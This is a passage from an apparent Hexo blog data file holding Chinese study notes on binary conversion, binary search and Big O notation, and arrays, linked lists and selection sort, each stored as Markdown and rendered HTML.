2 算，直到小数部分为 0\n\n* 例如 10.25 的小数部分是，0.25\\*2=0.5(取整数就是 0),0.5\\*2=1.0(取 1，然后终止，因为小数部分是 0），答案是 1010.01\n","source":"_posts/study-Conversion.md","raw":"---\ntitle: 了解二进制转换\ndate: 2018-05-03 22:46:38\ntags: 计算机基础\n---\n\n> 十进制是为了人们方便记忆使用的，而计算机的世界里只有 0 和 1，也就是只有二进制\n\n## 二进制\n\n* 想要了解计算机，首先要了解二进制\n\n> 以下来自维基百科\n\n二进制（binary）数是指用二进制记数系统，即以 2 为基数的记数系统表示的数字。这一系统中，通常用两个不同的符号 0（代表零）和 1（代表一）来表示。以 2 为基数代表系统是二进位制的。数字电子电路中，逻辑门的实现直接应用了二进制，因此现代的计算机和依赖计算机的设备里都用到二进制。每个数字称为一个位元（二进制位）或比特（Bit，Binary digit 的缩写）\n\n## 二进制转换成十进制\n\n> 以 2 为底数，指数是权重（换句话说是位数-1，权重从 0 开始）\n\n* 例如：11=>1*2^1+1*2\b^0=3\n\n## 十进制转换成二进制\n\n> 每一步除以进制数（2），直到商数为 0，然后取每一步的余数，再倒过来就是了\n\n* 例如 10=>10/2=5 余 0,5/2=2 余 1，2/2=1 余 0，1/2=0 余 1,然后再取倒就是 1010\n\n> 如果是有小数的，比如 10.25,那么小数部分乘以 2，取它整数部分的结果，然后再用这个结果继续乘以 2 算，直到小数部分为 0\n\n* 例如 10.25 的小数部分是，0.25\\*2=0.5(取整数就是 0),0.5\\*2=1.0(取 1，然后终止，因为小数部分是 0），答案是 1010.01\n","slug":"study-Conversion","published":1,"updated":"2018-05-06T04:27:22.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034k500120iof4fx5a29o","content":"<blockquote>\n<p>十进制是为了人们方便记忆使用的，而计算机的世界里只有 0 和 1，也就是只有二进制</p>\n</blockquote>\n<h2 id=\"二进制\"><a href=\"#二进制\" class=\"headerlink\" title=\"二进制\"></a>二进制</h2><ul>\n<li>想要了解计算机，首先要了解二进制</li>\n</ul>\n<blockquote>\n<p>以下来自维基百科</p>\n</blockquote>\n<p>二进制（binary）数是指用二进制记数系统，即以 2 为基数的记数系统表示的数字。这一系统中，通常用两个不同的符号 0（代表零）和 1（代表一）来表示。以 2 为基数代表系统是二进位制的。数字电子电路中，逻辑门的实现直接应用了二进制，因此现代的计算机和依赖计算机的设备里都用到二进制。每个数字称为一个位元（二进制位）或比特（Bit，Binary digit 的缩写）</p>\n<h2 id=\"二进制转换成十进制\"><a href=\"#二进制转换成十进制\" class=\"headerlink\" title=\"二进制转换成十进制\"></a>二进制转换成十进制</h2><blockquote>\n<p>以 2 为底数，指数是权重（换句话说是位数-1，权重从 0 开始）</p>\n</blockquote>\n<ul>\n<li>例如：11=&gt;1<em>2^1+1</em>2\b^0=3</li>\n</ul>\n<h2 id=\"十进制转换成二进制\"><a href=\"#十进制转换成二进制\" class=\"headerlink\" title=\"十进制转换成二进制\"></a>十进制转换成二进制</h2><blockquote>\n<p>每一步除以进制数（2），直到商数为 0，然后取每一步的余数，再倒过来就是了</p>\n</blockquote>\n<ul>\n<li>例如 10=&gt;10/2=5 余 0,5/2=2 余 1，2/2=1 余 0，1/2=0 余 1,然后再取倒就是 1010</li>\n</ul>\n<blockquote>\n<p>如果是有小数的，比如 10.25,那么小数部分乘以 2，取它整数部分的结果，然后再用这个结果继续乘以 2 算，直到小数部分为 0</p>\n</blockquote>\n<ul>\n<li>例如 10.25 的小数部分是，0.25*2=0.5(取整数就是 0),0.5*2=1.0(取 1，然后终止，因为小数部分是 0），答案是 1010.01</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>十进制是为了人们方便记忆使用的，而计算机的世界里只有 0 和 1，也就是只有二进制</p>\n</blockquote>\n<h2 id=\"二进制\"><a href=\"#二进制\" class=\"headerlink\" title=\"二进制\"></a>二进制</h2><ul>\n<li>想要了解计算机，首先要了解二进制</li>\n</ul>\n<blockquote>\n<p>以下来自维基百科</p>\n</blockquote>\n<p>二进制（binary）数是指用二进制记数系统，即以 2 为基数的记数系统表示的数字。这一系统中，通常用两个不同的符号 0（代表零）和 1（代表一）来表示。以 2 为基数代表系统是二进位制的。数字电子电路中，逻辑门的实现直接应用了二进制，因此现代的计算机和依赖计算机的设备里都用到二进制。每个数字称为一个位元（二进制位）或比特（Bit，Binary digit 的缩写）</p>\n<h2 id=\"二进制转换成十进制\"><a href=\"#二进制转换成十进制\" class=\"headerlink\" title=\"二进制转换成十进制\"></a>二进制转换成十进制</h2><blockquote>\n<p>以 2 为底数，指数是权重（换句话说是位数-1，权重从 0 开始）</p>\n</blockquote>\n<ul>\n<li>例如：11=&gt;1<em>2^1+1</em>2\b^0=3</li>\n</ul>\n<h2 id=\"十进制转换成二进制\"><a href=\"#十进制转换成二进制\" class=\"headerlink\" title=\"十进制转换成二进制\"></a>十进制转换成二进制</h2><blockquote>\n<p>每一步除以进制数（2），直到商数为 0，然后取每一步的余数，再倒过来就是了</p>\n</blockquote>\n<ul>\n<li>例如 10=&gt;10/2=5 余 0,5/2=2 余 1，2/2=1 余 0，1/2=0 余 1,然后再取倒就是 1010</li>\n</ul>\n<blockquote>\n<p>如果是有小数的，比如 10.25,那么小数部分乘以 2，取它整数部分的结果，然后再用这个结果继续乘以 2 算，直到小数部分为 0</p>\n</blockquote>\n<ul>\n<li>例如 10.25 的小数部分是，0.25*2=0.5(取整数就是 0),0.5*2=1.0(取 1，然后终止，因为小数部分是 0），答案是 1010.01</li>\n</ul>\n"},{"title":"读《图解算法》01-二分查找和大O表示法","date":"2018-05-06T06:10:22.000Z","_content":"\n## 场景\n\n### 电话本\n\n- 假设从电话本里面找 yoki 的电话，最常见的不是从开头开始找，而是从中间开始查找\n- 电话本是有序列表\n\n### 1-100 猜想\n\n> 以目标最少的次数猜到这个数字\n\n#### 简单查找\n\n- 如果从 1 开始猜，这叫简单查找，换句话说就是傻找\n- 如果是 99，那么得猜 99 次（临界点就是这个数）\n\n#### 二分查找\n\n- 如果从中间值开始猜\n- 那么临界点就是 99，最坏的情况下只用猜七次，50 错，75 错..这样猜\n\n那么得出结论，对于 n 个元素，用二分查找最多需要 log2 n 步，简单查找最多需要 n 步\n\n> 2^log2 n=n，log 叫对数运算，2^n 叫幂运算，他们互为逆运算\n\n## 算法实现\n\n> 注意二分查找法必须是有序的\n\n## 大 O 表示法\n\n> 指出的是最糟情况下的运行时间，也可以说是操作数\n\n- 这里用大 O 表示法讨论运行时间，都是讨论的最糟糕的临界值，比如简单查找 100 个元素，就是要看每一个元素。二分查找也是查看最远的，那么就只用查看 log100 个元素约为 7\n- log 时间这里的底数默认是 2，也就是默认是 log2\n- 其实我们是用幂运算的眼光来看，我们求的运行时其实就是指数\n\n### 概念\n\n- 大 O 表示法指出了算法有多快。例如，假设列表包含 n 个元素，简单查找需要检查每个元素，因此需要执行 n 次查找,运行时间位 O（n）\n- O(n),单位不是秒，大 O 表示法指的并不是以秒为单位的速度，而是能够比较操作数，它指出了算法运行时间的增速\n- 所以 n 是操作数的意思\n- 谈论算法的速度，是随着输入的增加，其运行事件将以怎么样的速度增加\n\n### 常见的大 O 运行时间\n\n> 由快到慢的经常遇到的五种，可以自己想象一下坐标系图\n\n- O（log n）,也叫对数时间，这样的算法包括二分查找\n- O(n)，线性时间，包括简单查找\n- O(n\\*log n)，包括快速排序（业界俗称快排），一种速度较快的快速排序\n- O（n^ 2）,包括选择排序，一种速度较慢的排序算法\n- O（n！），包括旅行商问题的解决方案，一种非常慢的算法\n\n#### 旅行商问题\n\n> 旅行商要前往 5 个城市，同时确保旅程最短，这样它要每个城市都去，然后计算总旅程，再挑选路线最短的\n\n- 5 个城市有 120 种不同的排列方式，因此需要 120 个操作\n- 这是一个非常非常慢的算法，但是这个问题也是计算机科学领域待解决的问题\n","source":"_posts/study-Graphical-algorithm01.md","raw":"---\ntitle: 读《图解算法》01-二分查找和大O表示法\ndate: 2018-05-06 14:10:22\ntags: 图解算法\n---\n\n## 场景\n\n### 电话本\n\n- 假设从电话本里面找 yoki 的电话，最常见的不是从开头开始找，而是从中间开始查找\n- 电话本是有序列表\n\n### 1-100 猜想\n\n> 以目标最少的次数猜到这个数字\n\n#### 简单查找\n\n- 如果从 1 开始猜，这叫简单查找，换句话说就是傻找\n- 如果是 99，那么得猜 99 次（临界点就是这个数）\n\n#### 二分查找\n\n- 如果从中间值开始猜\n- 那么临界点就是 99，最坏的情况下只用猜七次，50 错，75 错..这样猜\n\n那么得出结论，对于 n 个元素，用二分查找最多需要 log2 n 步，简单查找最多需要 n 步\n\n> 2^log2 n=n，log 叫对数运算，2^n 叫幂运算，他们互为逆运算\n\n## 算法实现\n\n> 注意二分查找法必须是有序的\n\n## 大 O 表示法\n\n> 指出的是最糟情况下的运行时间，也可以说是操作数\n\n- 这里用大 O 表示法讨论运行时间，都是讨论的最糟糕的临界值，比如简单查找 100 个元素，就是要看每一个元素。二分查找也是查看最远的，那么就只用查看 log100 个元素约为 7\n- log 时间这里的底数默认是 2，也就是默认是 log2\n- 其实我们是用幂运算的眼光来看，我们求的运行时其实就是指数\n\n### 概念\n\n- 大 O 表示法指出了算法有多快。例如，假设列表包含 n 个元素，简单查找需要检查每个元素，因此需要执行 n 次查找,运行时间位 O（n）\n- O(n),单位不是秒，大 O 表示法指的并不是以秒为单位的速度，而是能够比较操作数，它指出了算法运行时间的增速\n- 所以 n 是操作数的意思\n- 谈论算法的速度，是随着输入的增加，其运行事件将以怎么样的速度增加\n\n### 常见的大 O 运行时间\n\n> 由快到慢的经常遇到的五种，可以自己想象一下坐标系图\n\n- O（log n）,也叫对数时间，这样的算法包括二分查找\n- O(n)，线性时间，包括简单查找\n- O(n\\*log n)，包括快速排序（业界俗称快排），一种速度较快的快速排序\n- O（n^ 2）,包括选择排序，一种速度较慢的排序算法\n- O（n！），包括旅行商问题的解决方案，一种非常慢的算法\n\n#### 旅行商问题\n\n> 旅行商要前往 5 个城市，同时确保旅程最短，这样它要每个城市都去，然后计算总旅程，再挑选路线最短的\n\n- 5 个城市有 120 种不同的排列方式，因此需要 120 个操作\n- 这是一个非常非常慢的算法，但是这个问题也是计算机科学领域待解决的问题\n","slug":"study-Graphical-algorithm01","published":1,"updated":"2018-07-06T02:49:25.236Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034k600150iofegmtn2ht","content":"<h2 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h2><h3 id=\"电话本\"><a href=\"#电话本\" class=\"headerlink\" title=\"电话本\"></a>电话本</h3><ul>\n<li>假设从电话本里面找 yoki 的电话，最常见的不是从开头开始找，而是从中间开始查找</li>\n<li>电话本是有序列表</li>\n</ul>\n<h3 id=\"1-100-猜想\"><a href=\"#1-100-猜想\" class=\"headerlink\" title=\"1-100 猜想\"></a>1-100 猜想</h3><blockquote>\n<p>以目标最少的次数猜到这个数字</p>\n</blockquote>\n<h4 id=\"简单查找\"><a href=\"#简单查找\" class=\"headerlink\" title=\"简单查找\"></a>简单查找</h4><ul>\n<li>如果从 1 开始猜，这叫简单查找，换句话说就是傻找</li>\n<li>如果是 99，那么得猜 99 次（临界点就是这个数）</li>\n</ul>\n<h4 id=\"二分查找\"><a href=\"#二分查找\" class=\"headerlink\" title=\"二分查找\"></a>二分查找</h4><ul>\n<li>如果从中间值开始猜</li>\n<li>那么临界点就是 99，最坏的情况下只用猜七次，50 错，75 错..这样猜</li>\n</ul>\n<p>那么得出结论，对于 n 个元素，用二分查找最多需要 log2 n 步，简单查找最多需要 n 步</p>\n<blockquote>\n<p>2^log2 n=n，log 叫对数运算，2^n 叫幂运算，他们互为逆运算</p>\n</blockquote>\n<h2 id=\"算法实现\"><a href=\"#算法实现\" class=\"headerlink\" title=\"算法实现\"></a>算法实现</h2><blockquote>\n<p>注意二分查找法必须是有序的</p>\n</blockquote>\n<h2 id=\"大-O-表示法\"><a href=\"#大-O-表示法\" class=\"headerlink\" title=\"大 O 表示法\"></a>大 O 表示法</h2><blockquote>\n<p>指出的是最糟情况下的运行时间，也可以说是操作数</p>\n</blockquote>\n<ul>\n<li>这里用大 O 表示法讨论运行时间，都是讨论的最糟糕的临界值，比如简单查找 100 个元素，就是要看每一个元素。二分查找也是查看最远的，那么就只用查看 log100 个元素约为 7</li>\n<li>log 时间这里的底数默认是 2，也就是默认是 log2</li>\n<li>其实我们是用幂运算的眼光来看，我们求的运行时其实就是指数</li>\n</ul>\n<h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><ul>\n<li>大 O 表示法指出了算法有多快。例如，假设列表包含 n 个元素，简单查找需要检查每个元素，因此需要执行 n 次查找,运行时间位 O（n）</li>\n<li>O(n),单位不是秒，大 O 表示法指的并不是以秒为单位的速度，而是能够比较操作数，它指出了算法运行时间的增速</li>\n<li>所以 n 是操作数的意思</li>\n<li>谈论算法的速度，是随着输入的增加，其运行事件将以怎么样的速度增加</li>\n</ul>\n<h3 id=\"常见的大-O-运行时间\"><a href=\"#常见的大-O-运行时间\" class=\"headerlink\" title=\"常见的大 O 运行时间\"></a>常见的大 O 运行时间</h3><blockquote>\n<p>由快到慢的经常遇到的五种，可以自己想象一下坐标系图</p>\n</blockquote>\n<ul>\n<li>O（log n）,也叫对数时间，这样的算法包括二分查找</li>\n<li>O(n)，线性时间，包括简单查找</li>\n<li>O(n*log n)，包括快速排序（业界俗称快排），一种速度较快的快速排序</li>\n<li>O（n^ 2）,包括选择排序，一种速度较慢的排序算法</li>\n<li>O（n！），包括旅行商问题的解决方案，一种非常慢的算法</li>\n</ul>\n<h4 id=\"旅行商问题\"><a href=\"#旅行商问题\" class=\"headerlink\" title=\"旅行商问题\"></a>旅行商问题</h4><blockquote>\n<p>旅行商要前往 5 个城市，同时确保旅程最短，这样它要每个城市都去，然后计算总旅程，再挑选路线最短的</p>\n</blockquote>\n<ul>\n<li>5 个城市有 120 种不同的排列方式，因此需要 120 个操作</li>\n<li>这是一个非常非常慢的算法，但是这个问题也是计算机科学领域待解决的问题</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h2><h3 id=\"电话本\"><a href=\"#电话本\" class=\"headerlink\" title=\"电话本\"></a>电话本</h3><ul>\n<li>假设从电话本里面找 yoki 的电话，最常见的不是从开头开始找，而是从中间开始查找</li>\n<li>电话本是有序列表</li>\n</ul>\n<h3 id=\"1-100-猜想\"><a href=\"#1-100-猜想\" class=\"headerlink\" title=\"1-100 猜想\"></a>1-100 猜想</h3><blockquote>\n<p>以目标最少的次数猜到这个数字</p>\n</blockquote>\n<h4 id=\"简单查找\"><a href=\"#简单查找\" class=\"headerlink\" title=\"简单查找\"></a>简单查找</h4><ul>\n<li>如果从 1 开始猜，这叫简单查找，换句话说就是傻找</li>\n<li>如果是 99，那么得猜 99 次（临界点就是这个数）</li>\n</ul>\n<h4 id=\"二分查找\"><a href=\"#二分查找\" class=\"headerlink\" title=\"二分查找\"></a>二分查找</h4><ul>\n<li>如果从中间值开始猜</li>\n<li>那么临界点就是 99，最坏的情况下只用猜七次，50 错，75 错..这样猜</li>\n</ul>\n<p>那么得出结论，对于 n 个元素，用二分查找最多需要 log2 n 步，简单查找最多需要 n 步</p>\n<blockquote>\n<p>2^log2 n=n，log 叫对数运算，2^n 叫幂运算，他们互为逆运算</p>\n</blockquote>\n<h2 id=\"算法实现\"><a href=\"#算法实现\" class=\"headerlink\" title=\"算法实现\"></a>算法实现</h2><blockquote>\n<p>注意二分查找法必须是有序的</p>\n</blockquote>\n<h2 id=\"大-O-表示法\"><a href=\"#大-O-表示法\" class=\"headerlink\" title=\"大 O 表示法\"></a>大 O 表示法</h2><blockquote>\n<p>指出的是最糟情况下的运行时间，也可以说是操作数</p>\n</blockquote>\n<ul>\n<li>这里用大 O 表示法讨论运行时间，都是讨论的最糟糕的临界值，比如简单查找 100 个元素，就是要看每一个元素。二分查找也是查看最远的，那么就只用查看 log100 个元素约为 7</li>\n<li>log 时间这里的底数默认是 2，也就是默认是 log2</li>\n<li>其实我们是用幂运算的眼光来看，我们求的运行时其实就是指数</li>\n</ul>\n<h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><ul>\n<li>大 O 表示法指出了算法有多快。例如，假设列表包含 n 个元素，简单查找需要检查每个元素，因此需要执行 n 次查找,运行时间位 O（n）</li>\n<li>O(n),单位不是秒，大 O 表示法指的并不是以秒为单位的速度，而是能够比较操作数，它指出了算法运行时间的增速</li>\n<li>所以 n 是操作数的意思</li>\n<li>谈论算法的速度，是随着输入的增加，其运行事件将以怎么样的速度增加</li>\n</ul>\n<h3 id=\"常见的大-O-运行时间\"><a href=\"#常见的大-O-运行时间\" class=\"headerlink\" title=\"常见的大 O 运行时间\"></a>常见的大 O 运行时间</h3><blockquote>\n<p>由快到慢的经常遇到的五种，可以自己想象一下坐标系图</p>\n</blockquote>\n<ul>\n<li>O（log n）,也叫对数时间，这样的算法包括二分查找</li>\n<li>O(n)，线性时间，包括简单查找</li>\n<li>O(n*log n)，包括快速排序（业界俗称快排），一种速度较快的快速排序</li>\n<li>O（n^ 2）,包括选择排序，一种速度较慢的排序算法</li>\n<li>O（n！），包括旅行商问题的解决方案，一种非常慢的算法</li>\n</ul>\n<h4 id=\"旅行商问题\"><a href=\"#旅行商问题\" class=\"headerlink\" title=\"旅行商问题\"></a>旅行商问题</h4><blockquote>\n<p>旅行商要前往 5 个城市，同时确保旅程最短，这样它要每个城市都去，然后计算总旅程，再挑选路线最短的</p>\n</blockquote>\n<ul>\n<li>5 个城市有 120 种不同的排列方式，因此需要 120 个操作</li>\n<li>这是一个非常非常慢的算法，但是这个问题也是计算机科学领域待解决的问题</li>\n</ul>\n"},{"title":"读《图解算法》02-数组,链表和选择排序","date":"2018-05-06T08:40:38.000Z","_content":"\n## 数组和链表\n\n> 当需要将数据存储到内存的时候，我们请求计算机提供存储空间，计算机给我们一个存储地址。需要存储多项数据的时候，有两种基本方式——数组和链表。\n\n### 数组\n\n#### 想象画面\n\n> java 中一开始要确定数组的大小，不是没有道理的...\n\n- 两个人去电影院看电影，找到地方就座后，又来了一个朋友，但是你们下一个位置是别人占用了，你们三个是好朋友，没理由分开，只得挪去其他有三个位置的地方。\n- 所以来了新朋友是很麻烦的，但是有一种解决办法就是预先买了 10 个座位的，但是这样会浪费资源，要是超过 10 个还是转移（数组插入很麻烦）\n- 但是我想知道另外一个朋友坐哪里，这是很简单的，挨在一起（数组查找快）\n- 另一个朋友要走的话也很麻烦，因为剩下的朋友要往前来挨在一起坐，反正不管怎样大家是个整体，坐在一起就对了（数组删除很麻烦）\n\n### 链表\n\n> 链表和数组不一样，一定要顺序排着队这样。链表的元素可以存储在内存中的任何地方，当前元素存储存储着下一个元素的地址，从而使得一系列随机的内存地址串在了一起\n\n#### 想象画面\n\n- 寻宝游戏：前往第一个地址，那有宝箱，打开后是下一个宝箱的地址。\n- 但是我直接想要最后一个宝箱，是无法做到的，是要一个个查找直到倒数第二个才得到最后一个宝箱的位置（链表查找效率很低）\n- 移走一个宝箱很容易，直接把上一个宝箱的地址指向下一个的地址就可以了（链表删除很快）\n- 如果是五个人去看一部很火的电影，但是根本就无法坐一起，但是换做链表，就可以分开来做，所以这个来了新朋友一点也不麻烦（链表的优势就是插入）\n\n### 运行时\n\n> 这里是最差的情况，比如数组插入一个刚好就要移走（因为原来已经满了）\n\n|      | 数组 | 链表 |\n| ---- | :--: | ---: |\n| 插入 | O(n) | O(1) |\n| 读取 | O(1) | O(n) |\n| 删除 | O(n) | O(1) |\n\n- O（n）是线性时间，O（1）是常量时间\n\n## 选择排序\n\n### 场景\n\n- qq 音乐列表里面记录了每个音乐的播放次数，你要对它进行排序，从多到少\n- 一种办法是遍历这个列表，然后找到播放次数最多的，然后添加到一个新列表\n- 然后删除刚刚那个次数最多的，再继续这样找到第二多的\n- 需要检查的就越来越少\n\n### 算法复杂度（运行时）\n\n- 第一次每个元素都查看一次，那就是执行 n 次\n- 第二次执行 n-1 次\n- 依次查看最后得出，要执行 n（n-1）（n-2）..2\\*1=n\\*1/2\\*n\n- 但是大 O 表示法省略常数，所以最后是 O(n^2)\n","source":"_posts/study-Graphical-algorithm02.md","raw":"---\ntitle: 读《图解算法》02-数组,链表和选择排序\ndate: 2018-05-06 16:40:38\ntags: 图解算法\n---\n\n## 数组和链表\n\n> 当需要将数据存储到内存的时候，我们请求计算机提供存储空间，计算机给我们一个存储地址。需要存储多项数据的时候，有两种基本方式——数组和链表。\n\n### 数组\n\n#### 想象画面\n\n> java 中一开始要确定数组的大小，不是没有道理的...\n\n- 两个人去电影院看电影，找到地方就座后，又来了一个朋友，但是你们下一个位置是别人占用了，你们三个是好朋友，没理由分开，只得挪去其他有三个位置的地方。\n- 所以来了新朋友是很麻烦的，但是有一种解决办法就是预先买了 10 个座位的，但是这样会浪费资源，要是超过 10 个还是转移（数组插入很麻烦）\n- 但是我想知道另外一个朋友坐哪里，这是很简单的，挨在一起（数组查找快）\n- 另一个朋友要走的话也很麻烦，因为剩下的朋友要往前来挨在一起坐，反正不管怎样大家是个整体，坐在一起就对了（数组删除很麻烦）\n\n### 链表\n\n> 链表和数组不一样，一定要顺序排着队这样。链表的元素可以存储在内存中的任何地方，当前元素存储存储着下一个元素的地址，从而使得一系列随机的内存地址串在了一起\n\n#### 想象画面\n\n- 寻宝游戏：前往第一个地址，那有宝箱，打开后是下一个宝箱的地址。\n- 但是我直接想要最后一个宝箱，是无法做到的，是要一个个查找直到倒数第二个才得到最后一个宝箱的位置（链表查找效率很低）\n- 移走一个宝箱很容易，直接把上一个宝箱的地址指向下一个的地址就可以了（链表删除很快）\n- 如果是五个人去看一部很火的电影，但是根本就无法坐一起，但是换做链表，就可以分开来做，所以这个来了新朋友一点也不麻烦（链表的优势就是插入）\n\n### 运行时\n\n> 这里是最差的情况，比如数组插入一个刚好就要移走（因为原来已经满了）\n\n|      | 数组 | 链表 |\n| ---- | :--: | ---: |\n| 插入 | O(n) | O(1) |\n| 读取 | O(1) | O(n) |\n| 删除 | O(n) | O(1) |\n\n- O（n）是线性时间，O（1）是常量时间\n\n## 选择排序\n\n### 场景\n\n- qq 音乐列表里面记录了每个音乐的播放次数，你要对它进行排序，从多到少\n- 一种办法是遍历这个列表，然后找到播放次数最多的，然后添加到一个新列表\n- 然后删除刚刚那个次数最多的，再继续这样找到第二多的\n- 需要检查的就越来越少\n\n### 算法复杂度（运行时）\n\n- 第一次每个元素都查看一次，那就是执行 n 次\n- 第二次执行 n-1 次\n- 依次查看最后得出，要执行 n（n-1）（n-2）..2\\*1=n\\*1/2\\*n\n- 但是大 O 表示法省略常数，所以最后是 O(n^2)\n","slug":"study-Graphical-algorithm02","published":1,"updated":"2018-07-06T02:49:35.475Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034k600160iofmhaae5cf","content":"<h2 id=\"数组和链表\"><a href=\"#数组和链表\" class=\"headerlink\" title=\"数组和链表\"></a>数组和链表</h2><blockquote>\n<p>当需要将数据存储到内存的时候，我们请求计算机提供存储空间，计算机给我们一个存储地址。需要存储多项数据的时候，有两种基本方式——数组和链表。</p>\n</blockquote>\n<h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><h4 id=\"想象画面\"><a href=\"#想象画面\" class=\"headerlink\" title=\"想象画面\"></a>想象画面</h4><blockquote>\n<p>java 中一开始要确定数组的大小，不是没有道理的…</p>\n</blockquote>\n<ul>\n<li>两个人去电影院看电影，找到地方就座后，又来了一个朋友，但是你们下一个位置是别人占用了，你们三个是好朋友，没理由分开，只得挪去其他有三个位置的地方。</li>\n<li>所以来了新朋友是很麻烦的，但是有一种解决办法就是预先买了 10 个座位的，但是这样会浪费资源，要是超过 10 个还是转移（数组插入很麻烦）</li>\n<li>但是我想知道另外一个朋友坐哪里，这是很简单的，挨在一起（数组查找快）</li>\n<li>另一个朋友要走的话也很麻烦，因为剩下的朋友要往前来挨在一起坐，反正不管怎样大家是个整体，坐在一起就对了（数组删除很麻烦）</li>\n</ul>\n<h3 id=\"链表\"><a href=\"#链表\" class=\"headerlink\" title=\"链表\"></a>链表</h3><blockquote>\n<p>链表和数组不一样，一定要顺序排着队这样。链表的元素可以存储在内存中的任何地方，当前元素存储存储着下一个元素的地址，从而使得一系列随机的内存地址串在了一起</p>\n</blockquote>\n<h4 id=\"想象画面-1\"><a href=\"#想象画面-1\" class=\"headerlink\" title=\"想象画面\"></a>想象画面</h4><ul>\n<li>寻宝游戏：前往第一个地址，那有宝箱，打开后是下一个宝箱的地址。</li>\n<li>但是我直接想要最后一个宝箱，是无法做到的，是要一个个查找直到倒数第二个才得到最后一个宝箱的位置（链表查找效率很低）</li>\n<li>移走一个宝箱很容易，直接把上一个宝箱的地址指向下一个的地址就可以了（链表删除很快）</li>\n<li>如果是五个人去看一部很火的电影，但是根本就无法坐一起，但是换做链表，就可以分开来做，所以这个来了新朋友一点也不麻烦（链表的优势就是插入）</li>\n</ul>\n<h3 id=\"运行时\"><a href=\"#运行时\" class=\"headerlink\" title=\"运行时\"></a>运行时</h3><blockquote>\n<p>这里是最差的情况，比如数组插入一个刚好就要移走（因为原来已经满了）</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th></th>\n<th style=\"text-align:center\">数组</th>\n<th style=\"text-align:right\">链表</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>插入</td>\n<td style=\"text-align:center\">O(n)</td>\n<td style=\"text-align:right\">O(1)</td>\n</tr>\n<tr>\n<td>读取</td>\n<td style=\"text-align:center\">O(1)</td>\n<td style=\"text-align:right\">O(n)</td>\n</tr>\n<tr>\n<td>删除</td>\n<td style=\"text-align:center\">O(n)</td>\n<td style=\"text-align:right\">O(1)</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>O（n）是线性时间，O（1）是常量时间</li>\n</ul>\n<h2 id=\"选择排序\"><a href=\"#选择排序\" class=\"headerlink\" title=\"选择排序\"></a>选择排序</h2><h3 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h3><ul>\n<li>qq 音乐列表里面记录了每个音乐的播放次数，你要对它进行排序，从多到少</li>\n<li>一种办法是遍历这个列表，然后找到播放次数最多的，然后添加到一个新列表</li>\n<li>然后删除刚刚那个次数最多的，再继续这样找到第二多的</li>\n<li>需要检查的就越来越少</li>\n</ul>\n<h3 id=\"算法复杂度（运行时）\"><a href=\"#算法复杂度（运行时）\" class=\"headerlink\" title=\"算法复杂度（运行时）\"></a>算法复杂度（运行时）</h3><ul>\n<li>第一次每个元素都查看一次，那就是执行 n 次</li>\n<li>第二次执行 n-1 次</li>\n<li>依次查看最后得出，要执行 n（n-1）（n-2）..2*1=n*1/2*n</li>\n<li>但是大 O 表示法省略常数，所以最后是 O(n^2)</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"数组和链表\"><a href=\"#数组和链表\" class=\"headerlink\" title=\"数组和链表\"></a>数组和链表</h2><blockquote>\n<p>当需要将数据存储到内存的时候，我们请求计算机提供存储空间，计算机给我们一个存储地址。需要存储多项数据的时候，有两种基本方式——数组和链表。</p>\n</blockquote>\n<h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><h4 id=\"想象画面\"><a href=\"#想象画面\" class=\"headerlink\" title=\"想象画面\"></a>想象画面</h4><blockquote>\n<p>java 中一开始要确定数组的大小，不是没有道理的…</p>\n</blockquote>\n<ul>\n<li>两个人去电影院看电影，找到地方就座后，又来了一个朋友，但是你们下一个位置是别人占用了，你们三个是好朋友，没理由分开，只得挪去其他有三个位置的地方。</li>\n<li>所以来了新朋友是很麻烦的，但是有一种解决办法就是预先买了 10 个座位的，但是这样会浪费资源，要是超过 10 个还是转移（数组插入很麻烦）</li>\n<li>但是我想知道另外一个朋友坐哪里，这是很简单的，挨在一起（数组查找快）</li>\n<li>另一个朋友要走的话也很麻烦，因为剩下的朋友要往前来挨在一起坐，反正不管怎样大家是个整体，坐在一起就对了（数组删除很麻烦）</li>\n</ul>\n<h3 id=\"链表\"><a href=\"#链表\" class=\"headerlink\" title=\"链表\"></a>链表</h3><blockquote>\n<p>链表和数组不一样，一定要顺序排着队这样。链表的元素可以存储在内存中的任何地方，当前元素存储存储着下一个元素的地址，从而使得一系列随机的内存地址串在了一起</p>\n</blockquote>\n<h4 id=\"想象画面-1\"><a href=\"#想象画面-1\" class=\"headerlink\" title=\"想象画面\"></a>想象画面</h4><ul>\n<li>寻宝游戏：前往第一个地址，那有宝箱，打开后是下一个宝箱的地址。</li>\n<li>但是我直接想要最后一个宝箱，是无法做到的，是要一个个查找直到倒数第二个才得到最后一个宝箱的位置（链表查找效率很低）</li>\n<li>移走一个宝箱很容易，直接把上一个宝箱的地址指向下一个的地址就可以了（链表删除很快）</li>\n<li>如果是五个人去看一部很火的电影，但是根本就无法坐一起，但是换做链表，就可以分开来做，所以这个来了新朋友一点也不麻烦（链表的优势就是插入）</li>\n</ul>\n<h3 id=\"运行时\"><a href=\"#运行时\" class=\"headerlink\" title=\"运行时\"></a>运行时</h3><blockquote>\n<p>这里是最差的情况，比如数组插入一个刚好就要移走（因为原来已经满了）</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th></th>\n<th style=\"text-align:center\">数组</th>\n<th style=\"text-align:right\">链表</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>插入</td>\n<td style=\"text-align:center\">O(n)</td>\n<td style=\"text-align:right\">O(1)</td>\n</tr>\n<tr>\n<td>读取</td>\n<td 